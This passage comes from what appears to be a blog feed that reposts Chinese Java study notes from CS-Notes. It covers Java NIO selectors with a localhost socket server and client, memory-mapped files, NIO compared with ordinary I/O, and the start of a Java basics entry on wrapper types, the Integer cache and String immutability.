operator">=</span> selector<span class="token punctuation">.</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Set<span class="token operator">&lt;</span>SelectionKey<span class="token operator">></span> keys <span class="token operator">=</span> selector<span class="token punctuation">.</span><span class="token function">selectedKeys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Iterator<span class="token operator">&lt;</span>SelectionKey<span class="token operator">></span> keyIterator <span class="token operator">=</span> keys<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>keyIterator<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        SelectionKey key <span class="token operator">=</span> keyIterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>key<span class="token punctuation">.</span><span class="token function">isAcceptable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// ...</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>key<span class="token punctuation">.</span><span class="token function">isReadable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// ...</span>        <span class="token punctuation">}</span>        keyIterator<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="套接字-NIO-实例"><a href="#套接字-NIO-实例" class="headerlink" title="套接字 NIO 实例"></a>套接字 NIO 实例</h2><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">NIOServer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        Selector selector <span class="token operator">=</span> Selector<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ServerSocketChannel ssChannel <span class="token operator">=</span> ServerSocketChannel<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ssChannel<span class="token punctuation">.</span><span class="token function">configureBlocking</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ssChannel<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span>selector<span class="token punctuation">,</span> SelectionKey<span class="token punctuation">.</span>OP_ACCEPT<span class="token punctuation">)</span><span class="token punctuation">;</span>        ServerSocket serverSocket <span class="token operator">=</span> ssChannel<span class="token punctuation">.</span><span class="token function">socket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        InetSocketAddress address <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InetSocketAddress</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">8888</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        serverSocket<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            selector<span class="token punctuation">.</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Set<span class="token operator">&lt;</span>SelectionKey<span class="token operator">></span> keys <span class="token operator">=</span> selector<span class="token punctuation">.</span><span class="token function">selectedKeys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Iterator<span class="token operator">&lt;</span>SelectionKey<span class="token operator">></span> keyIterator <span class="token operator">=</span> keys<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>keyIterator<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                SelectionKey key <span class="token operator">=</span> keyIterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>key<span class="token punctuation">.</span><span class="token function">isAcceptable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    ServerSocketChannel ssChannel1 <span class="token operator">=</span> <span class="token punctuation">(</span>ServerSocketChannel<span class="token punctuation">)</span> key<span class="token punctuation">.</span><span class="token function">channel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// 服务器会为每个新连接创建一个 SocketChannel</span>                    SocketChannel sChannel <span class="token operator">=</span> ssChannel1<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    sChannel<span class="token punctuation">.</span><span class="token function">configureBlocking</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// 这个新连接主要用于从客户端读取数据</span>                    sChannel<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span>selector<span class="token punctuation">,</span> SelectionKey<span class="token punctuation">.</span>OP_READ<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>key<span class="token punctuation">.</span><span class="token function">isReadable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    SocketChannel sChannel <span class="token operator">=</span> <span class="token punctuation">(</span>SocketChannel<span class="token punctuation">)</span> key<span class="token punctuation">.</span><span class="token function">channel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">readDataFromSocketChannel</span><span class="token punctuation">(</span>sChannel<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    sChannel<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                keyIterator<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> String <span class="token function">readDataFromSocketChannel</span><span class="token punctuation">(</span>SocketChannel sChannel<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        ByteBuffer buffer <span class="token operator">=</span> ByteBuffer<span class="token punctuation">.</span><span class="token function">allocate</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        StringBuilder data <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            buffer<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> n <span class="token operator">=</span> sChannel<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            buffer<span class="token punctuation">.</span><span class="token function">flip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> limit <span class="token operator">=</span> buffer<span class="token punctuation">.</span><span class="token function">limit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> dst <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">char</span><span class="token punctuation">[</span>limit<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> limit<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                dst<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> buffer<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            data<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>dst<span class="token punctuation">)</span><span class="token punctuation">;</span>            buffer<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> data<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">NIOClient</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        Socket socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Socket</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">8888</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        OutputStream out <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String s <span class="token operator">=</span> <span class="token string">"hello world"</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="内存映射文件"><a href="#内存映射文件" class="headerlink" title="内存映射文件"></a>内存映射文件</h2><p>内存映射文件 I/O 是一种读和写文件数据的方法，它可以比常规的基于流或者基于通道的 I/O 快得多。</p><p>向内存映射文件写入可能是危险的，只是改变数组的单个元素这样的简单操作，就可能会直接修改磁盘上的文件。修改数据与将数据保存到磁盘是没有分开的。</p><p>下面代码行将文件的前 1024 个字节映射到内存中，map() 方法返回一个 MappedByteBuffer，它是 ByteBuffer 的子类。因此，可以像使用其他任何 ByteBuffer 一样使用新映射的缓冲区，操作系统会在需要时负责执行映射。</p><pre class=" language-java"><code class="language-java">MappedByteBuffer mbb <span class="token operator">=</span> fc<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>FileChannel<span class="token punctuation">.</span>MapMode<span class="token punctuation">.</span>READ_WRITE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h2><p>NIO 与普通 I/O 的区别主要有以下两点：</p><ul><li>NIO 是非阻塞的；</li><li>NIO 面向块，I/O 面向流。</li></ul><h1 id="八、参考资料"><a href="#八、参考资料" class="headerlink" title="八、参考资料"></a>八、参考资料</h1><ul><li>Eckel B, 埃克尔, 昊鹏, 等. Java 编程思想 [M]. 机械工业出版社, 2002.</li><li><a href="https://www.ibm.com/developerworks/cn/education/java/j-nio/j-nio.html" target="_blank" rel="noopener">IBM: NIO 入门</a></li><li><a href="http://tutorials.jenkov.com/java-nio/index.html" target="_blank" rel="noopener">Java NIO Tutorial</a></li><li><a href="https://tech.meituan.com/nio.html" target="_blank" rel="noopener">Java NIO 浅析</a></li><li><a href="https://www.ibm.com/developerworks/cn/java/j-lo-javaio/index.html" target="_blank" rel="noopener">IBM: 深入分析 Java I/O 的工作机制</a></li><li><a href="https://www.ibm.com/developerworks/cn/java/j-lo-chinesecoding/index.html" target="_blank" rel="noopener">IBM: 深入分析 Java 中的中文编码问题</a></li><li><a href="https://www.ibm.com/developerworks/cn/java/j-lo-serial/index.html" target="_blank" rel="noopener">IBM: Java 序列化的高级认识</a></li><li><a href="http://blog.csdn.net/shimiso/article/details/24990499" target="_blank" rel="noopener">NIO 与传统 IO 的区别</a></li><li><a href="http://stg-tud.github.io/sedc/Lecture/ws13-14/5.3-Decorator.html#mode=document" target="_blank" rel="noopener">Decorator Design Pattern</a></li><li><a href="http://labojava.blogspot.com/2012/12/socket-multicast.html" target="_blank" rel="noopener">Socket Multicast</a></li></ul><p>本文转载自: <a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20IO.md">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java IO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java基础</title>
      <link href="/2018/12/24/java/java-ji-chu/"/>
      <url>/2018/12/24/java/java-ji-chu/</url>
      
        <content type="html"><![CDATA[<h2 id="Java基础"><a href="#Java基础" class="headerlink" title="Java基础"></a>Java基础</h2><ul><li>一、数据类型<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#%E5%8C%85%E8%A3%85%E7%B1%BB%E5%9E%8B">包装类型</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#%E7%BC%93%E5%AD%98%E6%B1%A0">缓存池</a></li></ul></li><li>二、String<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#%E6%A6%82%E8%A7%88">概览</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#%E4%B8%8D%E5%8F%AF%E5%8F%98%E7%9A%84%E5%A5%BD%E5%A4%84">不可变的好处</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#string,-stringbuffer-and-stringbuilder">String, StringBuffer and StringBuilder</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#string-pool">String Pool</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#new-string%22abc%22">new String(“abc”)</a></li></ul></li><li>三、运算<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92">参数传递</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#float-%E4%B8%8E-double">float 与 double</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#%E9%9A%90%E5%BC%8F%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2">隐式类型转换</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#switch">switch</a></li></ul></li><li>四、继承<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90">访问权限</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#%E6%8A%BD%E8%B1%A1%E7%B1%BB%E4%B8%8E%E6%8E%A5%E5%8F%A3">抽象类与接口</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#super">super</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#%E9%87%8D%E5%86%99%E4%B8%8E%E9%87%8D%E8%BD%BD">重写与重载</a></li></ul></li><li>五、Object 通用方法<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#%E6%A6%82%E8%A7%88">概览</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#equals">equals()</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#hashcode">hashCode()</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#tostring">toString()</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#clone">clone()</a></li></ul></li><li>六、关键字<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#final">final</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#static">static</a></li></ul></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#%E4%B8%83%E5%8F%8D%E5%B0%84">七、反射</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#%E5%85%AB%E5%BC%82%E5%B8%B8">八、异常</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#%E4%B9%9D%E6%B3%9B%E5%9E%8B">九、泛型</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#%E5%8D%81%E6%B3%A8%E8%A7%A3">十、注解</a></li><li>十一、特性<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#java-%E5%90%84%E7%89%88%E6%9C%AC%E7%9A%84%E6%96%B0%E7%89%B9%E6%80%A7">Java 各版本的新特性</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#java-%E4%B8%8E-c-%E7%9A%84%E5%8C%BA%E5%88%AB">Java 与 C++ 的区别</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#jre-or-jdk">JRE or JDK</a></li></ul></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%9F%BA%E7%A1%80.md#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">参考资料</a></li></ul><h1 id="一、数据类型"><a href="#一、数据类型" class="headerlink" title="一、数据类型"></a>一、数据类型</h1><h2 id="包装类型"><a href="#包装类型" class="headerlink" title="包装类型"></a>包装类型</h2><p>八个基本类型：</p><ul><li>boolean/1</li><li>byte/8</li><li>char/16</li><li>short/16</li><li>int/32</li><li>float/32</li><li>long/64</li><li>double/64</li></ul><p>基本类型都有对应的包装类型，基本类型与其对应的包装类型之间的赋值使用自动装箱与拆箱完成。</p><pre class=" language-java"><code class="language-java">Integer x <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 装箱</span><span class="token keyword">int</span> y <span class="token operator">=</span> x<span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// 拆箱</span></code></pre><h2 id="缓存池"><a href="#缓存池" class="headerlink" title="缓存池"></a>缓存池</h2><p>new Integer(123) 与 Integer.valueOf(123) 的区别在于：</p><ul><li>new Integer(123) 每次都会新建一个对象；</li><li>Integer.valueOf(123) 会使用缓存池中的对象，多次调用会取得同一个对象的引用。</li></ul><pre class=" language-java"><code class="language-java">Integer x <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Integer y <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>x <span class="token operator">==</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// false</span>Integer z <span class="token operator">=</span> Integer<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Integer k <span class="token operator">=</span> Integer<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>z <span class="token operator">==</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// true</span></code></pre><p>valueOf() 方法的实现比较简单，就是先判断值是否在缓存池中，如果在的话就直接返回缓存池的内容。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> Integer <span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">>=</span> IntegerCache<span class="token punctuation">.</span>low <span class="token operator">&amp;&amp;</span> i <span class="token operator">&lt;=</span> IntegerCache<span class="token punctuation">.</span>high<span class="token punctuation">)</span>        <span class="token keyword">return</span> IntegerCache<span class="token punctuation">.</span>cache<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">-</span>IntegerCache<span class="token punctuation">.</span>low<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在 Java 8 中，Integer 缓存池的大小默认为 -128~127。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">128</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> high<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">final</span> Integer cache<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// high value may be configured by property</span>    <span class="token keyword">int</span> h <span class="token operator">=</span> <span class="token number">127</span><span class="token punctuation">;</span>    String integerCacheHighPropValue <span class="token operator">=</span>        sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span>VM<span class="token punctuation">.</span><span class="token function">getSavedProperty</span><span class="token punctuation">(</span><span class="token string">"java.lang.Integer.IntegerCache.high"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>integerCacheHighPropValue <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>integerCacheHighPropValue<span class="token punctuation">)</span><span class="token punctuation">;</span>            i <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// Maximum array size is Integer.MAX_VALUE</span>            h <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> Integer<span class="token punctuation">.</span>MAX_VALUE <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token operator">-</span>low<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span> NumberFormatException nfe<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// If the property cannot be parsed into an int, ignore it.</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    high <span class="token operator">=</span> h<span class="token punctuation">;</span>    cache <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">[</span><span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> j <span class="token operator">=</span> low<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> cache<span class="token punctuation">.</span>length<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>        cache<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">(</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// range [-128, 127] must be interned (JLS7 5.1.7)</span>    <span class="token keyword">assert</span> IntegerCache<span class="token punctuation">.</span>high <span class="token operator">>=</span> <span class="token number">127</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>编译器会在自动装箱过程调用 valueOf() 方法，因此多个 Integer 实例使用自动装箱来创建并且值相同，那么就会引用相同的对象。</p><pre class=" language-java"><code class="language-java">Integer m <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>Integer n <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>m <span class="token operator">==</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span></code></pre><p>基本类型对应的缓冲池如下：</p><ul><li>boolean values true and false</li><li>all byte values</li><li>short values between -128 and 127</li><li>int values between -128 and 127</li><li>char in the range \u0000 to \u007F</li></ul><p>在使用这些基本类型对应的包装类型时，就可以直接使用缓冲池中的对象。</p><p><a href="https://stackoverflow.com/questions/9030817/differences-between-new-integer123-integer-valueof123-and-just-123" target="_blank" rel="noopener">StackOverflow : Differences between new Integer(123), Integer.valueOf(123) and just 123</a></p><h1 id="二、String"><a href="#二、String" class="headerlink" title="二、String"></a>二、String</h1><h2 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h2><p>String 被声明为 final，因此它不可被继承。</p><p>内部使用 char 数组存储数据，该数组被声明为 final，这意味着 value 数组初始化之后就不能再引用其它数组。并且 String 内部没有改变 value 数组的方法，因此可以保证 String 不可变。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">String</span>    <span class="token keyword">implements</span> <span class="token class-name">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable</span><span class="token punctuation">,</span> Comparable<span class="token operator">&lt;</span>String<span class="token operator">></span><span class="token punctuation">,</span> CharSequence <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/** The value is used for character storage. */</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">char</span> value<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><h2 id="不可变的好处"><a href="#不可变的好处" class="headerlink" title="不可变的好处"></a>不可变的好处</h2><p><strong>1. 可以缓存 